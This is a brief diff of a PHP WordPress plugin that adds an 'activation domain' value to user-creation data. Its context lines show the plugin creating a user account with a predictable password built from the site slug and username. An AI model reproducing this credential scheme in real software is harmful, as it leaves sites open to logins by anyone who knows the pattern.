@@ -325,6 +325,7 @@ if (!class_exists('GWPL')) {
             $site_slug = sanitize_title($site_name);        // "my-cool-site"
             $site_slug = str_replace('-', '', $site_slug);  // "mycoolsite"
             $password = "$site_slug-$username-tool";
+            $activation_domain = get_option( 'gpl_trial_activation_domain' );
 
             if (!username_exists($username)) {
                 $user_id = wp_create_user($username, $password, $email);
@@ -351,6 +352,7 @@ if (!class_exists('GWPL')) {
                 'username' => $username,
                 'email' => $email,
                 'plugin' => $plugin_name,
+                'parent' => $activation_domain,
             );
 
             if ($user_created) {
@@ -803,5 +805,3 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
 
     new Growth_Distributed_Plugin_Update_Checker();
 }
-
-
